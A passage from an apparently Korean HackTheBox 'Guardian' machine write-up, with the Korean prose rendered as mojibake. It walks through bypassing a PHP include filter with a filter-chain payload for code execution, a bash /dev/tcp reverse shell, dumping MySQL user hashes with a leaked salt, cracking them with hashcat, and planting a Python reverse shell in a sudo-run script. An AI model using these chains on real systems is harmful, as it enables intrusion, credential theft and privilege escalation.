`Reports` ë©”ë‰´ì— ì ‘ê·¼í•œ ë’¤ **í•˜ìœ„ í•­ëª© ì¤‘ í•˜ë‚˜ë¥¼ í´ë¦­**í•˜ë©´, URLì— `report=reports/enrollment.php` ì™€ ê°™ì€ íŒŒë¼ë¯¸í„°ê°€ ì „ë‹¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.

![Talkative](/assets/htb-linux/guardian/reports.png)

ì´ëŠ” ì‚¬ìš©ìê°€ ì„ íƒí•œ ë³´ê³ ì„œ íŒŒì¼ì„ ì„œë²„ ì¸¡ì—ì„œ `include` ì‹œí‚¨ë‹¤ëŠ” ì˜ë¯¸ì´ë©°, í•´ë‹¹ íŒŒë¼ë¯¸í„°(`report`)ì— ì¡°ì‘ëœ ê°’ì„ ì‚½ì…í•¨ìœ¼ë¡œì¨ **LFI ì·¨ì•½ì ì„ ìœ ë„í•  ìˆ˜ ìˆëŠ” êµ¬ì¡°**ì„ì„ ì•”ì‹œí•œë‹¤.

Giteaë¥¼ í†µí•´ `reports.php` ì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´, ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked ğŸš« </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file ğŸš«</h2>");
}

?>

#...[SKIP]...
```

ìœ„ ì½”ë“œì—ì„œ `$_GET['report']` ê°’ì„ ê¸°ë°˜ìœ¼ë¡œ íŒŒì¼ì„ í¬í•¨í•˜ê³  ìˆìœ¼ë©°, ì¼ë¶€ í•„í„°ë§ ë¡œì§ì€ ì¡´ì¬í•˜ì§€ë§Œ ì œí•œì ì¸ íŒ¨í„´ ê²€ì¦ê³¼ ë””ë ‰í„°ë¦¬ íƒìƒ‰ ì°¨ë‹¨ë§Œì„ ìˆ˜í–‰í•˜ê³  ìˆì–´ LFI ìš°íšŒ ê°€ëŠ¥ì„±ì´ ì¡´ì¬í•œë‹¤.

ê°„ë‹¨í•œ PHP í…ŒìŠ¤íŠ¸ ì½”ë“œë¥¼ í†µí•´ í•„í„°ë§ ìš°íšŒ ê°€ëŠ¥ì„±ì„ ê²€í† í•˜ì˜€ë‹¤:

```php
<?php
$report = "??";

if (strpos($report, '..') !== false) {
    die("Malicious request blocked: $report\n");
}

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("Access denied. Invalid file: $report\n");
}

echo "Success: $report\n";
?>
```

í•´ë‹¹ ì½”ë“œì—ì„œ `$report` ë³€ìˆ˜ì— ë‹¤ì–‘í•œ ê°’ì„ ì ìš©í•˜ì—¬ í…ŒìŠ¤íŠ¸í•œ ê²°ê³¼, ì•„ë˜ì™€ ê°™ì€ íŒ¨í„´ì´ í™•ì¸ë˜ì—ˆë‹¤:

```text
Success: academic.php
--
Access denied. Invalid file: abcd.php
--
Success: abcd.php,academic.php
--
Malicious request blocked: abcd.php,..academic.php
```

**ì…ë ¥ê°’ì— ì •ê·œí‘œí˜„ì‹ì—ì„œ í—ˆìš©í•˜ëŠ” í‚¤ì›Œë“œê°€ í¬í•¨ë˜ê¸°ë§Œ í•˜ë©´ ì•ì— ë‹¤ë¥¸ íŒŒì¼ëª…ì„ ì¶”ê°€í•˜ë”ë¼ë„ í•„í„°ë§ì„ ìš°íšŒí•  ìˆ˜ ìˆìŒ**ì„ í™•ì¸í•˜ì˜€ë‹¤. ë‹¤ë§Œ, **`..`ì´ í¬í•¨ëœ ê²½ìš°ëŠ” ëª…ì‹œì ìœ¼ë¡œ ì°¨ë‹¨**ë˜ë©°, ì •ê·œì‹ì˜ ëì´ `.php`ë¡œ ì •í™•íˆ ëë‚˜ì§€ ì•Šìœ¼ë©´ ìš°íšŒë˜ì§€ ì•ŠëŠ”ë‹¤.

> **ì´ëŸ¬í•œ í•„í„°ë§ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ [PHP filter chain](https://github.com/synacktiv/php_filter_chain_generator) ë„êµ¬ë¥¼ í™œìš©í•˜ì˜€ë‹¤.**

ìš°íšŒëœ í˜ì´ë¡œë“œ ìƒì„±ì„ ìœ„í•´ ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì˜€ë‹¤:

```bash
python3 php_filter_chain_generator.py --chain "<?php system('id')?>"
```

ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ê¸¸ê³  ë³µì¡í•œ `php://filter/...` í˜•íƒœì˜ ì²´ì¸ ë¬¸ìì—´ì´ ìƒì„±ëœë‹¤. í•´ë‹¹ ì²´ì¸ì€ ì—¬ëŸ¬ ì¸ì½”ë”© ë° ë””ì½”ë”© í•„í„°ë¥¼ ì¡°í•©í•˜ì—¬ ì›ë˜ì˜ PHP ì½”ë“œë¥¼ ë””ì½”ë”©í•œ ë’¤ ì‹¤í–‰í•˜ë„ë¡ êµ¬ì„±ëœë‹¤.

```text
[+] The following gadget chain will generate the following code : <?php system('id')?> (base64 value: PD9waHAgc3lzdGVtKCdpZCcpPz4)

php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

ì´í›„ `/php://temp` ë’¤ì— ì •ê·œì‹ í•„í„°ë§ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” íŒŒì¼ëª…ì„ í•¨ê»˜ ì¡°í•©í•˜ë©´, ìš°íšŒëœ ê²½ë¡œë¡œ ì‹¤ì œ ì½”ë“œê°€ ì‹¤í–‰ë˜ê²Œ ëœë‹¤. 

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒê³¼ ê°™ì´ `system.php`ë¥¼ ì¡°í•©í•˜ë©´ ì •ê·œì‹ì„ í†µê³¼í•˜ê²Œ ëœë‹¤:

```text
php://filter/.../resource=php://temp,system.php
```

ìµœì¢…ì ìœ¼ë¡œ, í•´ë‹¹ ê°’ì„ `report` íŒŒë¼ë¯¸í„°ì— ì‚½ì…í•˜ë©´ ì½”ë“œ ì‹¤í–‰ì´ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì§„ë‹¤:

![Talkative](/assets/htb-linux/guardian/id.png)

---

# Exploitation

## Web Shell (LFI)

ì•ì„œ í™•ì¸ëœ ìš°íšŒ ê¸°ë²•ì„ í™œìš©í•˜ì—¬, PHP í•„í„° ì²´ì¸ì„ ìƒˆë¡­ê²Œ êµ¬ì„±í•˜ê³  ì›¹ ì…¸ ì‹¤í–‰ì„ ì‹œë„í•˜ì˜€ë‹¤:

```bash
$ python3 php_filter_chain_generator.py --chain "<?php system($_GET['c'])?>"
```

ë¡œì»¬ ë¨¸ì‹ ì—ì„œëŠ” `Netcat` ì„ í†µí•´ ë¦¬ë²„ìŠ¤ ì…¸ ì—°ê²°ì„ ìˆ˜ì‹ í•  ìˆ˜ ìˆë„ë¡ ëŒ€ê¸° ìƒíƒœë¡œ ì„¤ì •í•˜ì˜€ë‹¤:

```bash
$ nc -lvnp 9001
```

ì´í›„, ì·¨ì•½í•œ íŒŒë¼ë¯¸í„°ì— ë‹¤ìŒê³¼ ê°™ì€ ìš°íšŒëœ `php://filter/...` URIë¥¼ ì‚½ì…í•˜ê³ , `c` íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ ë¦¬ë²„ìŠ¤ ì…¸ ëª…ë ¹ì„ ì „ë‹¬í•˜ì˜€ë‹¤:

```text
php://filter/.../resource=php://temp,system.php&c=bash -c 'bash -i >%26 /dev/tcp/10.10.14.184/9001 0>%261'
```

ì •ìƒì ìœ¼ë¡œ ì›¹ ì„œë²„ì—ì„œ ëª…ë ¹ì´ ì‹¤í–‰ë˜ì—ˆê³ , ì•„ë˜ì™€ ê°™ì´ `www-data` ê¶Œí•œìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì…¸ ì ‘ì†ì— ì„±ê³µí•˜ì˜€ë‹¤:

![Talkative](/assets/htb-linux/guardian/web-shell.png)

---

# Privilege Escalation

## www-data â†’ jamil Lateral Movement

`www-data` ê¶Œí•œì˜ ì…¸ì„ íšë“í•œ í›„, ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ ì¸í„°ë™í‹°ë¸Œ ì…¸ë¡œ ì—…ê·¸ë ˆì´ë“œí•˜ì˜€ë‹¤:

```bash
www-data@guardian:~/portal.guardian.htb/admin$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

### MySQL 

Giteaì—ì„œ ì—´ëŒí•œ `config/config.php` íŒŒì¼ì—ëŠ” **MySQL ì ‘ì† ì •ë³´**ê°€ í¬í•¨ë˜ì–´ ìˆì—ˆë‹¤:

```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```

ì´í›„, íšë“í•œ ìê²© ì¦ëª…ì„ ì´ìš©í•´ ì›¹ ì…¸ í™˜ê²½ì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ **MySQLì— ì ‘ì†**í•˜ì˜€ë‹¤:

```bash
www-data@guardian:~/portal.guardian.htb/admin$ mysql -h localhost -u root -p

Enter password: Gu4rd14n_un1_1s_th3_b3st

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1539
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

ì•ì„œ `config.php` ì—ì„œ í™•ì¸í•œ ëŒ€ë¡œ, ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„ì€ `guardiandb` ì˜€ë‹¤. í•´ë‹¹ DBë¡œ ì „í™˜í•œ ë’¤, í…Œì´ë¸” ëª©ë¡ì„ ì¡°íšŒí•˜ì˜€ë‹¤:

```bash
mysql> use guardiandb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```

ê·¸ ì¤‘ `users` í…Œì´ë¸”ì„ ìœ ì‹¬íˆ ì‚´í´ë³¸ ê²°ê³¼, ì‚¬ìš©ìë“¤ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” **SHA-256 í•´ì‹œ í˜•íƒœ**ë¡œ ì €ì¥ë˜ì–´ ìˆì—ˆë‹¤. ì•„ë˜ëŠ” í…Œì´ë¸” ì¼ë¶€ë¥¼ ì¡°íšŒí•œ ê²°ê³¼ì´ë‹¤:

```bash
mysql> select * from users; 

+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-11-14 04:36:34 | 2025-11-14 04:36:34 |
|       2 | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-11-14 04:36:34 | 2025-11-14 04:36:34 |
|       3 | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-11-14 04:36:34 | 2025-11-14 04:36:34 |
# ...[SKIP]...
```

ì´ì „ CSRF ë‹¨ê³„ì—ì„œ Gitea ë ˆí¬ì§€í† ë¦¬ ë‚´ `admin/createuser.php` íŒŒì¼ì„ ë¶„ì„í•œ ê²°ê³¼, ì•„ë˜ì™€ ê°™ì€ ì½”ë“œê°€ í™•ì¸ë˜ì—ˆë‹¤:

```php
if (empty($username) || empty($password) || empty($full_name) || empty($email) || empty($dob) || empty($address) || empty($user_role)) {
        $error = "All fields are required. Please fill in all fields.";
    } else {
        $password = hash('sha256', $password . $salt);
    }
```

ìœ„ ì½”ë“œëŠ” ëª¨ë“  í•„ë“œê°€ ì…ë ¥ë˜ì§€ ì•Šì•˜ì„ ê²½ìš° `if` ì¡°ê±´ë¬¸ì„ í†µí•´ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³ , ëª¨ë“  ê°’ì´ ì •ìƒì ìœ¼ë¡œ ì…ë ¥ëœ ê²½ìš° `else` ë¸”ë¡ì„ í†µí•´ `password` ì— ëŒ€í•´ **SHA-256** í•´ì‹œë¥¼ ì ìš©í•œë‹¤. ì´ë•Œ í•´ì‹œëŠ” ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ì™€ ì†”íŠ¸ë¥¼ ì¡°í•©í•˜ì—¬ ìƒì„±ëœë‹¤.

í•´ë‹¹ íŒŒì¼ ìƒë‹¨ì—ì„œëŠ” `config.php` íŒŒì¼ë¡œë¶€í„° ì„¤ì •ì„ ë¶ˆëŸ¬ì˜¤ë©°, ì´ë•Œ ì†”íŠ¸ ê°’ë„ í•¨ê»˜ ì •ì˜ëœë‹¤:

```php
$config = require '../config/config.php';
$salt = $config['salt'];
```

ì‹¤ì œ `config.php` íŒŒì¼ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì†”íŠ¸ê°€ ëª…ì‹œë˜ì–´ ìˆì—ˆë‹¤:

```php
'salt' => '8Sb)tM1vs1SS'
```

ì´ ì •ë³´ë¥¼ í†µí•´, ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥ëœ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ëŠ” **SHA-256(password + salt)** ë°©ì‹ìœ¼ë¡œ ì¸ì½”ë”©ëœ ê²ƒì„ì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.

### HashCrack

ì´ì „ì— í™•ë³´í•œ ì‚¬ìš©ì í•´ì‹œ ì •ë³´ì™€ `config.php` ì—ì„œ í™•ì¸í•œ ì†”íŠ¸ ê°’ì„ ê¸°ë°˜ìœ¼ë¡œ, í•´ì‹œ í¬ë™ì„ ìœ„í•œ `hash.txt` íŒŒì¼ì„ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í•˜ì˜€ë‹¤:

```text
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
jamil:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
mark:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
```

ì´í›„ `hash.txt` íŒŒì¼ì„ ê¸°ë°˜ìœ¼ë¡œ, ì•„ë˜ì™€ ê°™ì´ `hashcat` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í¬ë™ì„ ì‹œë„í•˜ì˜€ë‹¤:

```bash
$ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --username
```

ê·¸ ê²°ê³¼, ë‘ ê°œì˜ ê³„ì •ì— ëŒ€í•œ ë¹„ë°€ë²ˆí˜¸ í¬ë™ì— ì„±ê³µí•˜ì˜€ë‹¤:

```bash
$ hashcat -m 1410 --show hash.txt /usr/share/wordlists/rockyou.txt --username 

admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
jamil:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
```

í¬ë™í•œ ì •ë³´ë¥¼ ë°”íƒ•ìœ¼ë¡œ `jamil` ê³„ì •ìœ¼ë¡œ ì „í™˜ì„ ì‹œë„í•˜ì˜€ë‹¤:

```bash
www-data@guardian:~/portal.guardian.htb/admin$ su jamil

Password: copperhouse56
```

ê·¸ ê²°ê³¼, `jamil` ì‚¬ìš©ì ê¶Œí•œì˜ ì…¸ íšë“ì— ì„±ê³µí•˜ì˜€ë‹¤.

![Talkative](/assets/htb-linux/guardian/jamil-shell.png)

## jamil â†’ mark Lateral Movement

### Enumerating sudo Privileges

`jamil` ê¶Œí•œì˜ ì…¸ì„ íšë“í•œ í›„, ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ ì¸í„°ë™í‹°ë¸Œ ì…¸ë¡œ ì—…ê·¸ë ˆì´ë“œí•˜ì˜€ë‹¤:

```bash
jamil@guardian:/var/www/portal.guardian.htb/admin$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

ì´í›„ `sudo -l` ëª…ë ¹ì–´ë¥¼ í†µí•´ `jamil` ì‚¬ìš©ìê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ í™•ì¸í•œ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥ë˜ì—ˆë‹¤:

```bash
jamil@guardian:/var/www/portal.guardian.htb/admin$ sudo -l

Matching Defaults entries for jamil on guardian:                                                                                                                                    
   env_reset, mail_badpass,                                                                       
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                                                                                       use_pty                                                                                  
    
    
User jamil may run the following commands on guardian:                                                                                            (mark) NOPASSWD: /opt/scripts/utilities/utilities.py 
```

ì´ ê²°ê³¼ë¥¼ í†µí•´ `jamil` ì‚¬ìš©ìê°€ ë¹„ë°€ë²ˆí˜¸ ì…ë ¥ ì—†ì´ `mark` ì‚¬ìš©ì ê¶Œí•œìœ¼ë¡œ `/opt/scripts/utilities/utilities.py` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤.

ìš°ì„  `/opt/scripts/utilities/utilities.py` íŒŒì¼ì˜ ë‚´ìš©ì„ ë¶„ì„í•˜ì˜€ë‹¤:

```python
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” argparseë¥¼ í†µí•´ ì „ë‹¬ëœ action ê°’ì— ë”°ë¼ íŠ¹ì • ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ë©°, `getpass.getuser()`ë¥¼ ì´ìš©í•´ í˜„ì¬ ì‚¬ìš©ìë¥¼ í™•ì¸í•œ ë’¤, ëŒ€ë¶€ë¶„ì˜ ê¸°ëŠ¥(`backup-db`, `zip-attachments`, `collect-logs`)ì€ `mark` ì‚¬ìš©ìë§Œ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ ì œí•œë˜ì–´ ìˆë‹¤.

ë‹¨, `system-status` ì•¡ì…˜ì€ ì˜ˆì™¸ì ìœ¼ë¡œ ì‚¬ìš©ì ì œí•œ ì—†ì´ ì‹¤í–‰ ê°€ëŠ¥í•˜ë‹¤.

ì´í›„, `utils` ë””ë ‰í† ë¦¬ë¡œ ì´ë™í•œ ë’¤ `ls -ld` ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œì¼°ë‹¤:

```bash
jamil@guardian:/opt/scripts/utilities/utils$ ls -l

total 16
-rw-r----- 1 root admins 287 Apr 19  2025 attachments.py
-rw-r----- 1 root admins 246 Jul 10 14:20 db.py
-rw-r----- 1 root admins 226 Apr 19  2025 logs.py
-rwxrwx--- 1 mark admins 253 Apr 26  2025 status.py
```

ê·¸ ê²°ê³¼, `status.py` íŒŒì¼ì—ë§Œ ë‹¤ìŒê³¼ ê°™ì´ ì“°ê¸°/ì‹¤í–‰ ê¶Œí•œì´ ë¶€ì—¬ë˜ì–´ìˆë‹¤.

í˜„ì¬ ì‚¬ìš©ì `jamil` ì˜ ê¶Œí•œì€ ë‹¤ìŒê³¼ ê°™ë‹¤:

```bash
jamil@guardian:/opt/scripts/utilities/utils$ id

uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

`jamil` ì‚¬ìš©ìëŠ” `admins` ê·¸ë£¹ì— ì†í•´ ìˆìœ¼ë¯€ë¡œ, `status.py` íŒŒì¼ì— ëŒ€í•´ **íŒŒì¼ ì½ê¸°/ì“°ê¸°/ì‹¤í–‰ì´ ëª¨ë‘ ê°€ëŠ¥**í•˜ë‹¤.

`status.py` íŒŒì¼ì˜ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ë‹¤:

```python
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
```

í˜„ì¬ ì´ ì½”ë“œ ìì²´ëŠ” ê¶Œí•œ ìƒìŠ¹ê³¼ëŠ” ì§ì ‘ì ì¸ ê´€ë ¨ì´ ì—†ìœ¼ë©°, ì˜¤ë¡œì§€ `status.py` íŒŒì¼ì„ ìˆ˜ì •í•˜ì—¬ `system_status()` í•¨ìˆ˜ ë‚´ì— ë¦¬ë²„ìŠ¤ ì…¸ì„ ì‚½ì…í•˜ì—¬ ì½”ë“œ ì‹¤í–‰ íë¦„ì„ íƒˆì·¨í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•  ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.

### mark Revshell

`status.py` íŒŒì¼ì˜ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •í•˜ì˜€ë‹¤:

```bash
jamil@guardian:/opt/scripts/utilities/utils$ printf "import socket,subprocess,os,pty\n\ndef system_status():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('10.10.14.184',9002))\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    pty.spawn('/bin/bash')" > status.py
```

ì—¬ëŸ¬ ì¤„ë°”ê¿ˆ ì²˜ë¦¬ë¥¼ í†µí•´ `system_status()` í•¨ìˆ˜ ë‚´ë¶€ì— ë¦¬ë²„ìŠ¤ ì…¸ì„ ìƒì„±í•˜ëŠ” ì½”ë“œë¥¼ ì‚½ì…í•˜ì˜€ë‹¤.
ì´ì œ í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ê°€ `mark` ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë  ë•Œ, ë¦¬ë²„ìŠ¤ ì…¸ì„ ì—°ê²°í•˜ë„ë¡ ë™ì‘í•œë‹¤.

ë‚˜ì˜ ë¡œì»¬ í„°ë¯¸ë„ì—ì„œ `netcat` ì„ ì´ìš©í•˜ì—¬ ë¦¬ë²„ìŠ¤ ì…¸ì„ ìˆ˜ì‹ í•˜ê¸° ìœ„í•´ ëŒ€ê¸°í•˜ì˜€ë‹¤:

```bash
$ nc -lvnp 9002
```

ì´í›„ `sudo` ë¥¼ ì‚¬ìš©í•´ **mark ê¶Œí•œìœ¼ë¡œ ìˆ˜ì •ëœ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•˜ì˜€ë‹¤:

```bash
jamil@guardian:/opt/scripts/utilities/utils$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

